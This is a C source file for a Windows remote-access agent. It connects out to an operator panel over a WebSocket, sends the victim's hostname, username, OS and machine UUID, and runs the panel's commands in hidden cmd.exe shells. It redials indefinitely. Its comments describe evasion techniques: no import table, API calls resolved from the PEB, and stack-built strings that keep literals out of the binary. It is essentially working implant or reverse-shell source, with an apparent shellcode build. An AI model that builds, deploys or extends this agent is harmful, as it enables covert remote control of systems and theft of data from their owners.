/* minimal_agent - a minimal agent for Windows (WinHTTP, 8+).
 *
 * A "minimal agent" in the relay protocol is anything that answers the
 * operator panel's Hello command with a 750-byte identity frame. Everything
 * else (file browsing, shells, screenshots) is optional and advertised - or
 * deliberately not advertised - via the capability mask.
 *
 * This agent implements the Shell category (mask bit 1): the panel opens a
 * terminal window whose commands run in a local cmd.exe, and their output
 * streams back. One side effect of advertising Shell without FileSystem:
 * the panel's file manager falls back to its PowerShell-over-shell backend,
 * so a basic file browser comes for free.
 *
 * Lifecycle:
 *   [1] connect: session -> connection -> HTTP GET -> 101 upgrade -> socket
 *   [2] serve:   wait for a panel command, dispatch it, send one reply
 *   [3] redial:  on a lost connection (transport error or a close frame),
 *               wait 1..32 s and dial again - an agent never gives up.
 *               Only the Exit command (or killing the process) ends it;
 *               live shells survive a redial.
 *
 * Build - the single flavor is DEPENDENCY-FREE: no CRT, no import table,
 * no -lwinhttp. Every OS call (WinHTTP included) is resolved at runtime
 * from the PEB; the process starts at our own entry (entry.c), not the
 * CRT startup. Two steps - compile, then link:
 *
 *   gcc -O2 -c main.c transport.c shell.c report.c system_facts.c \
 *       winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
 *       peb.c system.c djb2.c logger.c entry.c freestanding.c
 *   gcc -O2 -s -nostdlib -e entry -o minimal_agent.exe \
 *       entry.o main.o transport.o shell.o report.o system_facts.o \
 *       winhttp_api.o memory.o string.o kernel32.o advapi.o ntdll.o \
 *       peb.o system.o djb2.o logger.o freestanding.o
 *
 * (entry.c MUST be in the object list and -e entry names the real entry
 *  point - omitting either leaves ___chkstk_ms unresolved or the entry
 *  address pointing at the wrong symbol. Verify with:
 *  objdump -f minimal_agent.exe | grep "start address" vs nm entry)
 *
 * Run:
 *   minimal_agent.exe <URL>        e.g. ... https://relay.example.com/agent
 *   minimal_agent.exe <URL> -v     verbose: dump every command's raw bytes
 *
 * The URL comes only from the command line; nothing is hardcoded.
 *
 * ============================================================================
 * Module map (one header = one topic)
 * ============================================================================
 *   main.c           this file - connect, dispatch, cleanup (main)
 *   protocol.h       opcodes, statuses, identity frame, capability mask
 *   wire.h           tiny little-endian writers (header-only)
 *   transport.h/.c   the WebSocket pipe: ws_send / ws_receive
 *   shell.h/.c       the cmd.exe pool: spawn / read / write / teardown
 *   report.h/.c      human-facing output: errors, hex dumps, decoders
 *   system_facts.h/.c  machine UUID + hostname/user/OS facts
 */

#include "winhttp_api.h"   /* runtime-resolved WinHTTP table (no <winhttp.h>) */

#include "string.h"     /* strcmp (the -v flag) */
#include "protocol.h"
#include "wire.h"
#include "transport.h"
#include "shell.h"
#include "report.h"
#include "system_facts.h"
#include "types.h"
#include "wintypes.h"
#include "memory.h"
#include "logger.h"
#include "kernel32.h"
#include "entry.h"      /* agent_main: the -nostdlib entry contract */
#include "stackstrings.h" /* C1 step 3b: functional strings built on the stack */


/* Commit tag baked into the identity frame. CI overrides it with
 * -DAGENT_COMMIT_HASH="<8-char git hash>"; local builds keep the study tag. */
/* CI passes -DAGENT_COMMIT_HASH="<8 hex chars>" AND -DAGENT_COMMIT_HASH_DEFINED;
 * local builds fall back to a stack-built tag (a literal would sit in .rdata). */

/* ==========================================================================
 * The identity frame (the reply to Hello)
 * ======================================================================== */

/* Build the full 754-byte v5 identity frame. Returns the frame size.
 * Metadata first (status, api version, breed id, commit hash, build
 * number, 64-bit flag) so the panel can detect the layout before the
 * variable-length fields; then UUID + facts; mask last. See protocol.h. */
static int build_identity_frame(unsigned char frame[IDENTITY_FRAME_SIZE],
                                const system_facts *facts)
{
    MemoryZero(frame, IDENTITY_FRAME_SIZE);
    int pos = 0;

    write_u32_le(frame, &pos, STATUS_OK);            /* status = 0       */
    write_u32_le(frame, &pos, ID_API_VERSION);       /* API version = 5  */
    write_u32_le(frame, &pos, ID_AGENT_NAME_ID);     /* breed id = 1     */
#ifdef AGENT_COMMIT_HASH_DEFINED
    write_ascii_field(frame, &pos, AGENT_COMMIT_HASH, ID_COMMIT_HASH_SIZE);
#else
    CHAR commit_buf[9];
    StrCommitDefault(commit_buf);
    write_ascii_field(frame, &pos, commit_buf, ID_COMMIT_HASH_SIZE);
#endif
    write_u32_le(frame, &pos, ID_BUILD_NUMBER);      /* build number     */

    frame[pos++] = (unsigned char)(sizeof(void *) == 8 ? 1 : 0);  /* 64-bit */

    unsigned char uuid[16];
    get_machine_uuid(uuid);
    MemoryCopy(frame + pos, uuid, 16);               /* machine UUID     */
    pos += 16;

    write_ascii_field(frame, &pos, facts->hostname,  ID_HOSTNAME_SIZE);
    write_ascii_field(frame, &pos, facts->username,  ID_USERNAME_SIZE);
    CHAR arch64[4]; StrX64(arch64);
    CHAR arch86[4]; StrX86(arch86);
    write_ascii_field(frame, &pos,
                      sizeof(void *) == 8 ? arch64 : arch86, ID_ARCH_SIZE);
    CHAR platform_buf[8];
    StrPlatformWindows(platform_buf);
    write_ascii_field(frame, &pos, platform_buf, ID_PLATFORM_SIZE);
    write_ascii_field(frame, &pos, facts->os_version, ID_OS_VERSION_SIZE);

    write_u64_le(frame, &pos, CAPABILITY_MASK);      /* capability mask  */

    return pos;    /* == IDENTITY_FRAME_SIZE */
}

/* ==========================================================================
 * Command handlers (one reply per request, except Exit)
 * ======================================================================== */

/* C1 step 2: process-lifetime state lives on agent_main's frame in one
 * context struct, passed down as a single pointer (the seed of the
 * platform-context pattern; a file-static would be .bss). */
typedef struct {
    shell_slot *shells;     /* the pool array, owned by agent_main   */
    int verbose;            /* -v: dump every command's raw bytes    */
    const WINHTTP_API *winhttp;  /* session table, owned by run_session */
} agent_ctx;

/* Reply to Hello: collect facts, build the frame, send it, show it. */
static DWORD handle_hello(const agent_ctx *ctx, HINTERNET socket)
{
    (void)ctx;
    system_facts facts;
    collect_system_facts(&facts);
    
    unsigned char frame[IDENTITY_FRAME_SIZE];
    int frame_len = build_identity_frame(frame, &facts);

    DWORD err = ws_send(ctx->winhttp, socket, frame, (DWORD)frame_len);
    if (err != NO_ERROR)
        return err;
    LOG_INFO("Identity sent to the panel (%d bytes)\n", frame_len);
#ifdef LOGGING_ENABLED
    if (ctx->verbose)
        print_identity_frame(frame, frame_len);
#else
    (void)ctx;
#endif
    return NO_ERROR;
}

/* OpenShell: find a free pool slot (the slot index IS the shell id). */
static DWORD handle_open_shell(const agent_ctx *ctx, HINTERNET socket)
{
    int id = shell_open(ctx->shells);

    DWORD err;
    if (id < 0) {
        unsigned char status_error[4] = {1, 0, 0, 0};
        err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
        LOG_ERROR("OpenShell failed - replied status 1\n");
    } else {
        /* Exactly 12 bytes: the panel reads the id only when the
         * reply is at least this long, else it assumes id 0. */
        unsigned char reply[12];
        int pos = 0;
        write_u32_le(reply, &pos, STATUS_OK);
        write_u64_le(reply, &pos, (unsigned long long)id);
        err = ws_send(ctx->winhttp, socket, reply, sizeof(reply));
        LOG_INFO("Shell %d opened (cmd.exe spawned) - id sent\n", id);
    }
    return err;
}

/* WriteShell: [shellId:8][UTF-8 input + NUL]. The panel already appends
 * "\n" to commands - appending another newline would execute every
 * command twice. */
static DWORD handle_write_shell(const agent_ctx *ctx, HINTERNET socket, const incoming_message *msg)
{
    unsigned long long id = 0;
    for (int i = 8; i >= 1; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    int status = STATUS_ERROR;
    if (slot) {
        /* Strip trailing NUL(s); "\x03" passes through as Ctrl+C. */
        DWORD end = msg->length;
        while (end > 9 && msg->data[end - 1] == '\0')
            end--;
        if (end > 9 && shell_write(slot, msg->data + 9, end - 9) == 0)
            status = STATUS_OK;
    }

    unsigned char reply[4] = {0, 0, 0, 0};
    reply[0] = (unsigned char)status;
    DWORD err = ws_send(ctx->winhttp, socket, reply, sizeof(reply));
    if (err == NO_ERROR) {
        LOG_INFO("Write to shell %llu - status %d\n", id, status);
    }
    return err;
}

/* ReadShell: drain what the shell has buffered. An empty chunk is legal
 * (that is "idle"); a dead shell reports status 1. */
static DWORD handle_read_shell(const agent_ctx *ctx, HINTERNET socket, const incoming_message *msg)
{
    unsigned long long id = 0;
    for (int i = 8; i >= 1; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    unsigned char status_error[4] = {1, 0, 0, 0};
    DWORD err;

    if (!slot) {
        err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
        if (err == NO_ERROR)
            LOG_ERROR("Read shell %llu - unknown id, status 1\n", id);
    } else {
        /* C1 step 2: 64K+5 on the frame - chkstk probes it, .bss not needed */
        unsigned char chunk[4 + SHELL_READ_CHUNK + 1];
        DWORD got = 0;
        int r = shell_read(slot, chunk + 4, SHELL_READ_CHUNK, &got);

        if (r == SHELL_READ_DEAD) {
            err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
            if (err == NO_ERROR)
                LOG_ERROR("Shell %llu exited - status 1, slot freed\n", id);
        } else {
            /* [status:4][chunk][NUL] - the NUL terminator is part of the
             * v4 contract and is written explicitly (the panel strips
             * exactly one). An empty chunk = "idle". */
            int pos = 0;
            write_u32_le(chunk, &pos, STATUS_OK);
            chunk[4 + got] = '\0';
            err = ws_send(ctx->winhttp, socket, chunk, 4 + got + 1);
            if (err == NO_ERROR) {
                if (r == SHELL_READ_IDLE)
                    LOG_INFO("Read shell %llu - idle\n", id);
                else
                    LOG_INFO("Read shell %llu - %lu byte(s)\n", id, got);
            }
        }
    }
    return err;
}

/* CloseShell: "close and forget" - unknown ids still get status 0. */
static DWORD handle_close_shell(const agent_ctx *ctx, HINTERNET socket, const incoming_message *msg)
{
    unsigned long long id = 0;
    for (int i = 8; i >= 1; i--)
        id = (id << 8) | msg->data[i];

    shell_slot *slot = shell_lookup(ctx->shells, id);
    if (slot) {
        shell_teardown(slot);
        LOG_INFO("Shell %llu closed (cmd.exe terminated)\n", id);
    } else {
        LOG_INFO("Close shell %llu - not open (still ok)\n", id);
    }

    unsigned char reply[4] = {0, 0, 0, 0};
    DWORD err = ws_send(ctx->winhttp, socket, reply, sizeof(reply));
    if (err == NO_ERROR)
        LOG_INFO("No error reply sent for CloseShell %llu\n", id);
    return err;
}

/* ==========================================================================
 * main
 * ======================================================================== */

/* One full connect/serve/close session (defined below main). */
static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived);

INT32 agent_main(INT32 argc, CHAR *argv[])
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel)) {
        LOG_ERROR("Failed to load kernel32.dll\n");
    }
   
    const CHAR *url_arg = NULL;
    int verbose_flag = 0;   /* C1 step 2: folded into ctx below */
    int start = (argc >= 2) ? 1 : 0;
    for (int i = start; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0) {
            verbose_flag = 1;
            continue;
        }
        if (url_arg == NULL)
            url_arg = argv[i];
    }

    if (url_arg == NULL && argc == 1 && argv[0] != NULL && strcmp(argv[0], "-v") != 0)
        url_arg = argv[0];

    if (url_arg == NULL) {
        const CHAR *prog = (argc > 0 && argv[0]) ? argv[0] : "minimal_agent.exe";
        LOG_ERROR("Usage: %s <URL> [-v]\n", prog);
        return 1;
    }

    /* C1 step 2: process-lifetime storage lives ON THIS FRAME. agent_main
     * does not return until the agent exits, so these locals ARE the
     * process globals - without a byte of .bss. */
    WCHAR url[2048];
    shell_slot shells[SHELL_POOL_SIZE];
    /* C1 step 3b follow-up: an INITIALIZED frame array is still .rdata -
     * the compiler pools the constants and memcpy's them in (caught live:
     * the blob died reading the pooled {1,2,4,8,16,32}). Scalar writes only. */
    int backoff_steps[6];
    /* volatile WRITES (trap: scalar const-array init still pools into
     * .rdata as one movdqu - seen live in the blob harness). Writing
     * through a volatile pointer keeps each store an instruction. */
    volatile int *bs = backoff_steps;
    bs[0] = 1;  bs[1] = 2;  bs[2] = 4;  bs[3] = 8;  bs[4] = 16; bs[5] = 32;
    const int backoff_count = 6;
    int backoff_pos = 0;
    agent_ctx ctx;

    MemoryZero(shells, sizeof(shells));   /* all slots start free */
    ctx.shells  = shells;
    ctx.verbose = verbose_flag;
    ctx.winhttp = NULL;                   /* run_session fills it */
    if (AnsiToWide(url_arg, url, 2048) == -1) {
        LOG_ERROR("AnsiToWide(URL) failed\n");
        return 1;
    }

    /* ----- The agent loop: dial, serve, redial. A lost connection is a
     * normal event (the relay drops agent sockets when the paired operator
     * disconnects, deploys recycle the Durable Object, idle NATs time out);
     * each loss is answered with a fresh dial after a capped backoff. Only
     * Exit (RC_EXIT) or an unrecoverable local failure ends the process.
     * Live shells survive a redial - only the panel's view of them is new
     * ids after the panel re-opens. */
    int rc = RC_SESSION_LOST;
    while (rc == RC_SESSION_LOST) {
        int long_lived = 0;
        rc = run_session(&ctx, url, &long_lived);
        if (rc == RC_SESSION_LOST) {

            int wait_s = backoff_steps[backoff_pos];
            /* Grow toward the cap while dialing keeps failing, but reset
             * after a session that lived a while - one blip on a healthy
             * day should not wait half a minute on the next one. */
            if (long_lived)
                backoff_pos = 0;
            else if (backoff_pos + 1 < backoff_count)
                backoff_pos++;

            LOG_INFO("[i] connection lost - redialing in %d s ...\n", wait_s);
            kernel.Sleep((DWORD)wait_s * 1000);
        }
    }
    return rc;
}

/* One full session: connect, serve until the connection dies or Exit
 * arrives, close cleanly. Returns RC_EXIT / RC_SESSION_LOST / RC_LOCAL_ERROR.
 * All handles are released on every path (no leaks across redials).
 * *long_lived is set when the session served at least one command - the
 * caller uses it to reset the redial backoff after a healthy session. */
static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
{
    /* Resource state for correct cleanup via goto. */
    int rc = RC_SESSION_LOST;     /* default: dial again          */
    HINTERNET session = NULL, connection = NULL, request = NULL;
    HINTERNET socket = NULL;
    KERNEL32 kernel32;
    if (!KERNEL32_Ctor(&kernel32)) {
        LOG_ERROR("Failed to load kernel32.dll\n");
    }

    /* The runtime-resolved WinHTTP table (winhttp_api.h) - the same
     * per-call Ctor idiom as KERNEL32 above: stack-local, no statics.
     * Fail fast: without the table nothing below can run. */
    WINHTTP_API winhttp;
    if (!WINHTTP_API_Ctor(&winhttp)) {
        LOG_ERROR("Failed to resolve the WinHTTP table\n");
        return RC_LOCAL_ERROR;
    }
    ((agent_ctx *)ctx)->winhttp = &winhttp;   /* session-lifetime, this frame */

    *long_lived = 0;                    /* set on the first served reply */

    /* ----- Stage 2: split the URL into components (WinHttpCrackUrl) ----- */
    URL_COMPONENTS uc;
    MemoryZero(&uc, sizeof(uc));
    uc.dwStructSize = sizeof(uc);

    WCHAR host[256];   /* C1 step 2: frame-local, probes pay for size */
    WCHAR path[2048];
    uc.lpszHostName    = host;  uc.dwHostNameLength = 256;
    uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;

    if (!winhttp.WinHttpCrackUrl(url, 0, 0, &uc)) {
        LOG_ERROR("WinHttpCrackUrl (invalid URL?) failed: %lu\n", kernel32.GetLastError());
        rc = RC_LOCAL_ERROR;          /* a bad URL will not heal itself */
        goto cleanup;
    }
    if (uc.nScheme != INTERNET_SCHEME_HTTP &&
        uc.nScheme != INTERNET_SCHEME_HTTPS) {
        LOG_ERROR("Only http:// and https:// URLs are supported\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    if (uc.dwHostNameLength == 0) {
        LOG_ERROR("URL has no host name\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    BOOL https = (uc.nScheme == INTERNET_SCHEME_HTTPS);

    /* ----- Stage 3: session -> connection -> upgrade request ----- */
    LOG_INFO("Connecting to %ls://%ls%ls ... ",
           https ? L"https" : L"http", uc.lpszHostName, uc.lpszUrlPath);
    

    WCHAR ua_buf[18];                     /* "minimal_agent/1.0" + NUL */
    StrUserAgent(ua_buf);
    session = winhttp.WinHttpOpen(ua_buf,
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }

    connection = winhttp.WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
    if (!connection) { LOG_ERROR("WinHttpConnect failed: %lu\n", kernel32.GetLastError()); goto cleanup; }

    /* An ordinary HTTPS GET - the WebSocket headers are added by the
     * UPGRADE option below, not by us. */
    DWORD request_flags = WINHTTP_FLAG_REFRESH;
    if (https) request_flags |= WINHTTP_FLAG_SECURE;   /* TLS for https */
    WCHAR get_buf[4];
    StrGetMethodW(get_buf);
    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL,
                                 WINHTTP_NO_REFERER,
                                 WINHTTP_DEFAULT_ACCEPT_TYPES, request_flags);
    if (!request) { LOG_ERROR("WinHttpOpenRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup; }

    /* This option takes no buffer: lpBuffer must be NULL and length 0. */
    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
                          NULL, 0)) {
        LOG_ERROR("winhttp.WinHttpSetOption(UPGRADE_TO_WEB_SOCKET) failed: %lu\n", kernel32.GetLastError());
        goto cleanup;
    }

    if (!winhttp.WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        LOG_ERROR("WinHttpSendRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup;
    }

    /* Required step: receive the handshake response ("101 Switching
     * Protocols") before completing the upgrade. */
    if (!winhttp.WinHttpReceiveResponse(request, NULL)) {
        LOG_ERROR("WinHttpReceiveResponse failed: %lu\n", kernel32.GetLastError()); goto cleanup;
    }

    /* Finish the handshake; the request handle is spent and gets closed. */
    socket = winhttp.WinHttpWebSocketCompleteUpgrade(request, 0);
    if (!socket) {
        LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed: %lu\n", kernel32.GetLastError());
        goto cleanup;
    }
    winhttp.WinHttpCloseHandle(request);
    request = NULL;
    LOG_INFO("Connected (HTTP 101 Switching Protocols)\n");

    /* ----- Stage 4: serve commands. Every request gets exactly one reply
     * - except Exit, which gets none and terminates the agent. ----- */
    LOG_INFO("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
    incoming_message msg;   /* C1 step 2: 64K receive buffer on the frame */
    for (int index = 1; ; index++) {
        *long_lived = 1;                /* a command arrived on this wire */
        BOOL closed = FALSE;

        DWORD err = ws_receive(&winhttp, socket, &msg, &closed);
        if (err != NO_ERROR) {
            LOG_ERROR("WinHttpWebSocketReceive failed: %lu\n", err);
            goto cleanup;             /* rc stays SESSION_LOST -> redial */
        }
        if (closed) {
            LOG_ERROR("Server closed the connection - redialing.\n");
            goto cleanup;             /* a close frame is also just a loss */
        }

#ifdef LOGGING_ENABLED
        if (ctx->verbose)
            print_command(index, &msg);
#endif

        unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;

        /* A message that overflowed the receive buffer is refused whole:
         * executing its head would run half a command. */
        if (msg.truncated) {
            unsigned char status_error[4] = {1, 0, 0, 0};
            err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
            if (err == NO_ERROR) {
                LOG_ERROR("Message over %d bytes - refused, status 1\n",
                       MAX_MESSAGE_SIZE);
                continue;
            }
            LOG_ERROR("winhttp.WinHttpWebSocketSend(reply) failed: %lu\n", err);
            goto cleanup;
        }

        if (opcode == CMD_EXIT) {       /* Exit: no reply, terminate now */
            LOG_ERROR("Exit requested - terminating.\n");
            rc = RC_EXIT;               /* a valid command, not an error */
            goto cleanup;               /* spec: terminate immediately  */
        }

        if (opcode == CMD_HELLO && msg.length == 1) {
            err = handle_hello(ctx, socket);
        } else if (opcode == CMD_OPEN_SHELL) {
            err = handle_open_shell(ctx, socket);
        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 9) {
            err = handle_write_shell(ctx, socket, &msg);
        } else if (opcode == CMD_READ_SHELL && msg.length >= 9) {
            err = handle_read_shell(ctx, socket, &msg);
        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 9) {
            err = handle_close_shell(ctx, socket, &msg);
        } else {                        /* not implemented: status = 1 */
            unsigned char status_error[4] = {1, 0, 0, 0};
            err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
            if (err == NO_ERROR) {
                LOG_INFO("Command 0x%02x not implemented - replied status 1\n",
                       opcode);
            }
        }
        if (err != NO_ERROR) {
            LOG_ERROR("winhttp.WinHttpWebSocketSend(reply) failed: %lu\n", err);
            goto cleanup;
        }
    }

    /* Unreachable: the serve loop above only leaves via goto cleanup. */

cleanup:
    if (socket)     winhttp.WinHttpCloseHandle(socket);
    if (request)    winhttp.WinHttpCloseHandle(request);
    if (connection) winhttp.WinHttpCloseHandle(connection);
    if (session)    winhttp.WinHttpCloseHandle(session);
    return rc;
}